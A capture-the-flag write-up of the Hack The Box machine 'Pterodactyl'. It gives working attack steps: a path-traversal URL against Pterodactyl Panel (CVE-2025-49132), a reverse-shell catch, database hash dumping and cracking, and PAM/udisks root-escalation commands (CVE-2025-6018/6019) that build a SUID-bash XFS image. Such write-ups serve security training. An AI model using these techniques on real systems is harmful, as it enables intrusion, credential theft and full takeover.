## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
- Medium
- Linux
- Seasonal Machine - Season 10
```
## IP-Address
```IP-Address
10.129.240.23
```
## RustScan
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6 (protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.21.5
```
- Browser `http://pterodactyl.htb/`
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>My Minecraft Server</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="global.css">
</head>

<body class="body">
    <header style="position: relative; text-align: center;">
        <img alt="Header Image" src="Public/Header.png" style="width: 100%; height: auto; max-height: 25rem; object-fit: cover; display: block;" />
        <h1 class="title">MonitorLand</h1>
        <hr class="separator">
    </header>
    
    <main>
        <p>
            Join our awesome Minecraft community!
        </p>
        <div class="ip-box" id="server-ip">play.pterodactyl.htb</div>
        <button onclick="copyIP()">Copy Server IP</button>
        <p style="margin-top:2rem;">
            Version: 1.20.x <br>SMP and Vanilla Servers.<br> <a href="/changelog.txt">Changelogs</a>
        </p>
    </main>

    <footer>
        &copy; 2025 MonitorLand. Not affiliated with Mojang.
    </footer>

    <script>
        function copyIP() {
            const ip = document.getElementById('server-ip').innerText;
            const textArea = document.createElement("textarea");
            textArea.value = ip;
            textArea.style.position = "fixed";
            document.body.appendChild(textArea);
            textArea.focus();
            textArea.select();

            try {
                document.execCommand("copy");
                alert("Server IP copied to clipboard");
            } catch (err) {
                alert("Failed to copy");
            }

            document.body.removeChild(textArea);
        }
    </script>
</body>
</html>
```
- File `changelog.txt`
```changelog.txt
MonitorLand - CHANGELOG.txt
======================================

Version 1.20.X

[Added] Main Website Deployment
--------------------------------
- Deployed the primary landing site for MonitorLand.
- Implemented homepage, and link for Minecraft server.
- Integrated site styling and dark-mode as primary.

[Linked] Subdomain Configuration
--------------------------------
- Added DNS and reverse proxy routing for play.pterodactyl.htb.
- Configured NGINX virtual host for subdomain forwarding.

[Installed] Pterodactyl Panel v1.11.10
--------------------------------------
- Installed Pterodactyl Panel.
- Configured environment:
  - PHP with required extensions.
  - MariaDB 11.8.3 backend.

[Enhanced] PHP Capabilities
-------------------------------------
- Enabled PHP-FPM for smoother website handling on all domains.
- Enabled PHP-PEAR for PHP package management.
- Added temporary PHP debugging via phpinfo()
```
- Got a Way to `phpinfo()` at `http://pterodactyl.htb/phpinfo.php
- Important Points from the page

| Category           | Key Information                         |
| ------------------ | --------------------------------------- |
| PHP Version        | 8.4.8                                   |
| Server API         | PHP-FPM (FastCGI)                       |
| OS                 | Linux (openSUSE)                        |
| Running User       | `wwwrun`                                |
| Running Group      | `www`                                   |
| Document Root      | `/var/www/html`                         |
| phpinfo Path       | `/var/www/html/phpinfo.php`             |
| include_path       | `.:/usr/share/php8:/usr/share/php/PEAR` |
| PEAR Installed     | Yes                                     |
| open_basedir       | **Not set**                             |
| disable_functions  | **None**                                |
| File Uploads       | Enabled                                 |
| Writable Temp Dirs | Default system temp                     |
| PHAR Support       | Enabled                                 |
| Session Handler    | `files`                                 |
| Session Storage    | Filesystem                              |
| Database Drivers   | MySQL / PDO enabled                     |
| MySQL Socket       | `/run/mysql/mysql.sock`                 |
| Command Execution  | `system`, `exec`, `shell_exec` usable   |
| Privilege Level    | Web user (`wwwrun`)                     |
| Exploit Impact     | Arbitrary file write → RCE              |
- Got Idea for `SubDomain` at `http://pterodactyl.htb`
- Try some manually
```bash
curl -I http://panel.pterodactyl.htb                               
HTTP/1.1 200 OK
Server: nginx/1.21.5
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/8.4.8
Cache-Control: no-cache, private
Date: Wed, 11 Feb 2026 01:53:19 GMT
Set-Cookie: XSRF-TOKEN=eyJpdiI6IjhEZjRhRTlldHNQNjdVU1VPc3pZU2c9PSIsInZhbHVlIjoiNlRsdWNwZmNoM0JoaEpBYmgzbU12T2hOaVFHSkxmcFh3VXpIRnJqMlk2UEJOaThXMittV3JpYTZqdndraUQ4TS9rcFpwS1RvQnlMYkxJT2FtcGFwcUN6ekdSekw4VUlFOVFhYkE0cFdldjRKUG5iWTlaMFBhNk1NNHR0N1htby8iLCJtYWMiOiJjZDk5YjZlZWNjMmIzZTgxYTI1NzUwNmY5YjBlOGQwZjFhNDQ4MWUzNDUyYzRhYmI5YjJhNTY1M2I1OTMzODAyIiwidGFnIjoiIn0%3D; expires=Wed, 11 Feb 2026 13:53:19 GMT; Max-Age=43200; path=/; samesite=lax
Set-Cookie: pterodactyl_session=eyJpdiI6ImZyTXk4Q3hwQ0dQTXpTNE9razlyN3c9PSIsInZhbHVlIjoiUDNmQldLRk8vZWdnb284SEU1djl1cnNIM2E0ZG5zOTVhU050ZGZqRFB5ZFl3TTRMQ3EzdUlLc1BOd3l0Lzgrc2tYdVlzbFIwZWg0REF5VndMRE5QdlFmeXlrK3dSaUlvdm82K3VnMG8vVDRhNkJ5bDU5d3A0RjZwQ0phYU1PbkciLCJtYWMiOiI5OTk4Mzg1Y2IzMWQxZGYxNmRhNjhhYjgwOGRlYTFhNDlkYWJjODg1ZGM4ZWRmZWMxYTBkY2IyZTEyY2EzMjA2IiwidGFnIjoiIn0%3D; expires=Wed, 11 Feb 2026 13:53:19 GMT; Max-Age=43200; path=/; httponly; samesite=lax
```
- Got `panel` SubDomain 
- Enumerate More
```html
<login Page>
```
- Dorking and searching about `pterodactyl` Found out an vulnerability 
- CVE- #CVE-2025-49132 
```bash
$ searchsploit pterodactyl                                                         
Exploit Title                                |  Path
Pterodactyl Panel 1.11.11 -(RCE)             | multiple/webapps/52341.py  
$ python3 52341.py http://panel.pterodactyl.htb
http://panel.pterodactyl.htb/ => pterodactyl:[password omitted]@127.0.0.1:3306/panel 
```
- Got the Vulnerability - #LFI
- In program Code Found the LFI `ENDPOINT` - locales/locale?locale
- `http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database`
```database
{"..\/..\/..\/pterodactyl":{"config\/database":{"default":"mysql","connections":{"mysql":{"driver":"mysql","url":"","host":"127.0.0.1","port":"3306","database":"panel","username":"pterodactyl","password":"[password omitted]","unix_socket":"","charset":"utf8mb4","collation":"utf8mb4_unicode_ci","prefix":"","prefix_indexes":"1","strict":"","timezone":"+00{{00}}","sslmode":"prefer","options":{"1014":"1"}}},"migrations":"migrations","redis":{"client":"predis","options":{"cluster":"redis","prefix":"pterodactyl_database_"},"default":{"scheme":"tcp","path":"\/run\/redis\/redis.sock","host":"127.0.0.1","username":"","password":"","port":"6379","database":"0","context":[]},"sessions":{"scheme":"tcp","path":"\/run\/redis\/redis.sock","host":"127.0.0.1","username":"","password":"","port":"6379","database":"1","context":[]}}}}}
```
- same as above 
- Look for more config Files
:"Pterodactyl\\Facades\\LogTarget"}}}

| Category       | Key              | Value                                                    | Why Important                     |
| -------------- | ---------------- | -------------------------------------------------------- | --------------------------------- |
| Application    | Name             | `Pterodactyl`                                            | Confirms target application       |
| Version        | Version          | `1.11.10`                                                | Used to look for known vulns      |
| Environment    | env              | `production`                                             | Debug disabled (expected)         |
| Base URL       | url              | `http://panel.pterodactyl.htb`                           | Confirms **panel subdomain**      |
| Crypto         | APP_KEY          | `[app key omitted]` | **Critical** – session forgery    |
| Crypto         | Cipher           | `AES-256-CBC`                                            | Used with APP_KEY                 |
| Auth           | Auth Provider    | `Pterodactyl\Models\User`                                | User model used                   |
| Sessions       | Session Provider | `Illuminate\Session\SessionServiceProvider`              | Confirms Laravel session handling |
| Password Reset | Passwords Table  | `password_resets`                                        | Possible user enumeration         |
| Maintenance    | Driver           | `file`                                                   | Filesystem interaction            |
| Framework      | Framework        | Laravel                                                  | Enables known attack chains       |
| Panel Access   | Locale           | `en`                                                     | Confirms locale loader abuse path |
| Timezone       | timezone         | `UTC`                                                    | Minor, confirms config read       |
| Debug          | debug            | empty                                                    | No verbose errors                 |
- Lets Use PEER Technique which is used as LFI -> RCE
- Github - `https://github.com/Ahmedf000/-CVE-2025-49132_Pterodactyl-_HTB-Season-10/blob/main/exploit.sh`

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.68] from (UNKNOWN) [10.129.240.23] 44464
bash: cannot set terminal process group (1208): Inappropriate ioctl for device
bash: no job control in this shell
wwwrun@pterodactyl:/var/www/pterodactyl/public> ls
ls
assets
favicons
index.php
js
themes
wwwrun@pterodactyl:/var/www/pterodactyl/public> cd ..
cd ..
wwwrun@pterodactyl:/var/www/pterodactyl> cd /home
cd /home
wwwrun@pterodactyl:/home> ls
ls
headmonitor
phileasfogg3
wwwrun@pterodactyl:/home> cd headmonitor
cd headmonitor
bash: cd: headmonitor: Permission denied
wwwrun@pterodactyl:/home> cd phileasfogg3
cd phileasfogg3
wwwrun@pterodactyl:/home/phileasfogg3> ls
ls
bin
user.txt
wwwrun@pterodactyl:/home/phileasfogg3> cat user.txt
cat user.txt
[flag omitted]
```
## User Flag
```Flag
[flag omitted]
```
- Database Lookup
```bash
$mariadb -u pterodactyl -p[password omitted] -h 127.0.0.1
ariaDB [panel]> SELECT id,username,email,password,root_admin FROM users;
SELECT id,username,email,password,root_admin FROM users;
+----+--------------+------------------------------+--------------------------------------------------------------+------------+
| id | username     | email                        | password                                                     | root_admin |
+----+--------------+------------------------------+--------------------------------------------------------------+------------+
|  2 | headmonitor  | headmonitor@pterodactyl.htb  | [hash omitted] |          1 |
|  3 | phileasfogg3 | phileasfogg3@pterodactyl.htb | [hash omitted] |          0 |
+----+--------------+------------------------------+--------------------------------------------------------------+------------+
2 rows in set (0.001 sec)
```
- Got The Creds
```creds
$ hashcat hash.txt -m 3200 --show
[hash omitted]:[password omitted]
```
## SSH Login
```bash
ssh phileasfogg3@pterodactyl.htb
Passowrd : [password omitted]
ls
bin  linpeas.sh  user.txt
phileasfogg3@pterodactyl:~> sudo -l
Matching Defaults entries for phileasfogg3 on pterodactyl:
    always_set_home, env_reset, env_keep="LANG LC_ADDRESS LC_CTYPE LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS
    XDG_SESSION_COOKIE", !insults, secure_path=/usr/sbin\:/usr/bin\:/sbin\:/bin, targetpw

User phileasfogg3 may run the following commands on pterodactyl:
    (ALL) ALL
phileasfogg3@pterodactyl:~>
```
- Find `SUID`
```bash
phileasfogg3@pterodactyl:~> find / -perm -4000 -type f 2>/dev/null
/usr/lib/dbus-1/dbus-daemon-launch-helper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/expiry
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/crontab
/sbin/mount.nfs
/sbin/unix2_chkpwd
/sbin/unix_chkpwd
```
## Privilege Escalation
- hello
- Github - 
```github
https://github.com/muyuanlove/CVE-2025-6018-CVE-2025-6019-Privilege-Escalation-Exploit/tree/main
```
- Clone this repo and `exp.sh`
- And Run on own Kali - Attacker
```bash
# Create 300MB XFS image
dd if=/dev/zero of=xfs.image bs=1M count=300
mkfs.xfs -f xfs.image

# Mount and install SUID bash
mkdir mnt
sudo mount -t xfs xfs.image mnt
sudo cp /bin/bash mnt/bash
sudo chmod 4755 mnt/bash
sudo umount mnt
rmdir mnt

# Verify (should show 300M)
ls -lh xfs.image
```
and send `exp.sh` & `xfs.image` to Target Machine
```bash
cat > ~/.pam_environment << 'EOF'
XDG_SEAT OVERRIDE=seat0
XDG_VTNR OVERRIDE=1
EOF

# Verify configuration
cat ~/.pam_environment
```
- Check The `Pam` environment & `Exit` & `Re-Login`
```bash
# Re-login via SSH (PAM config now active)
ssh phileasfogg3@pterodactyl.htb
Password:[password omitted]


# Verify PAM is active (should return "('yes',)")
gdbus call --system --dest org.freedesktop.login1 \
    --object-path /org/freedesktop/login1 \
    --method org.freedesktop.login1.Manager.CanReboot

# Execute privilege escalation script
bash exp.sh
```
- Its a `Chinese` Script
```bash
 phileasfogg3@pterodactyl:~> bash exp.sh
\033[96m\033[1m
╔════════════════════════════════════════════════════════════╗
║  CVE-2025-6018 + CVE-2025-6019 Local Exploit              ║
║  在目标机器上执行（手动登录后）                              ║
╚════════════════════════════════════════════════════════════╝
\033[0m

This script must be run on the target machine after:
  1. ~/.pam_environment created
  2. ~/xfs.image uploaded
  3. Logged out and back in (PAM active)

Press Enter to start exploitation...1

[1/5] Checking environment
▶ Checking ~/.pam_environment
✓ PAM config found
▶ Checking ~/xfs.image
✓ XFS image found (300M)
▶ Testing CanReboot (verify PAM active)
✓ CanReboot = yes (PAM is active!)

[5/5] Executing root shell
▶ Testing root access
/tmp/blockdev.13LGK3/bash -p -c 'id'
uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)
✓ Root access confirmed!
▶ Reading /root/root.txt
/tmp/blockdev.13LGK3/bash -p -c 'cat /root/root.txt'
════════════════════════════════════════════════════════════
║ ROOT FLAG                                               ║
║ [flag omitted]                           ║
════════════════════════════════════════════════════════════
✓ Flag captured!
Launching interactive root shell...
Press Ctrl+D or type 'exit' to quit
bash-5.3# whoami
root
════════════════════════════════════════════════════════════
✓ Privilege escalation successful! 🐱 Cat saved! (154s)
════════════════════════════════════════════════════════════
```
## Root Flag
```Flag
[flag omitted] 
```

#### **Initial Enumeration & Access Table**

| **Stage**   | **Target/Service** | **Discovery**      | **Technical Action**                                     | **Result**                              |
| ----------- | ------------------ | ------------------ | -------------------------------------------------------- | --------------------------------------- |
| **Recon**   | Port 80 (Nginx)    | `changelog.txt`    | Identified Pterodactyl Panel v1.11.10 and `phpinfo.php`. | Target software and version confirmed.  |
| **Exploit** | `/locales/locale`  | CVE-2025-49132     | Path Traversal / LFI via `locale.json?locale=../../`.    | **Arbitrary File Read** (Config files). |
| **Access**  | PHP-FPM / PEAR     | No `open_basedir`  | Used PEER technique to convert LFI into RCE.             | **Shell as `wwwrun`**.                  |
| **Looting** | MariaDB            | `.env` credentials | Logged into DB: `[password omitted]`.                | Extracted user password hashes.         |
| **Pivot**   | SSH                | Hashcat (Bcrypt)   | Cracked `phileasfogg3` password: `[password omitted]`.             | **User Shell: `phileasfogg3`**.         |

#### Summary of the "Chain" - Escalation

|**Step**|**Component**|**Action**|**Result**|
|---|---|---|---|
|**1**|**PAM**|Inject `.pam_environment`|Trick system into thinking you are "Local"|
|**2**|**Polkit**|Check Authorization|Grant permission to use `udisksctl`|
|**3**|**UDisks2**|Trigger XFS Repair|Mounts your disk without security flags|
|**4**|**Kernel**|Execute SUID Shell|**Instant Root Access**|

# END
